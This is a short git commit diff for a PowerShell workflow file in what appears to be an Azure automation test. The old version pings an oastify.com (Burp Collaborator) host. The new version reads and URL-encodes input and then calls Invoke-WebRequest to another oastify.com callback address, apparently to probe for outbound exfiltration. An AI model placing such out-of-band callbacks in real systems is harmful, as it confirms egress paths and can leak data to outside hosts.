c6b55e915413ede2c40a53434ea1fc94f807bb3d
0czar <60838416+0czar@users.noreply.github.com>
2022-12-23 11:52:50 +0200

    Update and rename azure7.ps1 to azure8.ps1

--- azure7.ps1
+++
@@ -1,4 +0,0 @@
-Workflow czar
-{ 
-    Test-Connection -computername "gdxo3awybvcnhksbeilann8lpcv3jvnjc.oastify.com" -count 3
-}
---
+++ azure8.ps1
@@ -0,0 +1,6 @@
+Workflow czar
+{ 
+    $msg = Read-Host
+    $encmsg = [System.Web.HttpUtility]::UrlEncode($msg)
+    Invoke-WebRequest -Uri "http://jczr2dv1aybqgnredlkdmq7oofu6iz9ny.oastify.com/yessss"
+}
